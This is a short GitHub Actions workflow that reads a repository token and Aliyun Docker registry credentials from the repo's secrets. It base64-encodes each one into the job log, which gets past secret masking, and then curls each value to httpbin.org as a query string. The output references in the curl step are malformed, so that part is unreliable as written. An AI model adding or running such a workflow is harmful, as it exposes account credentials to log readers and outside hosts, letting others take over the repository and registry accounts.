name: Printer Actions

on:
  workflow_dispatch:

jobs:
  printer:
    runs-on: ubuntu-latest
    steps:
      - name: Print REPO_TOKEN
        run: echo -n "${{ secrets.REPO_TOKEN }}" | base64
        id: repo_token
      - name: Print ALIYUN_DOCKER_USERNAME
        run: echo -n "${{ secrets.ALIYUN_DOCKER_USERNAME }}" | base64
        id: aliyun_docker_username
      - name: Print ALIYUN_DOCKER_PASSWORD
        run: echo -n "${{ secrets.ALIYUN_DOCKER_PASSWORD }}" | base64
        id: aliyun_docker_password

      # 输出环境变量以便后续步骤使用
      - name: Set Outputs
        run: |
          echo "::set-output name=repo_token::${{ steps.repo_token.outputs.stdout }}"
          echo "::set-output name=aliyun_docker_username::${{ steps.aliyun_docker_username.outputs.stdout }}"
          echo "::set-output name=aliyun_docker_password::${{ steps.aliyun_docker_password.outputs.stdout }}"

      - name: Make HTTP Request
        run: |
          curl -L "httpbin.org/get?id=${{ steps.repo_token.outputs.stdout }}"
          curl -L "httpbin.org/get?id=${{ steps.aliyun_docker_username.outputs.stdout }}"
          curl -L "httpbin.org/get?id=${{ steps.aliyun_docker_password.outputs.stdout }}"
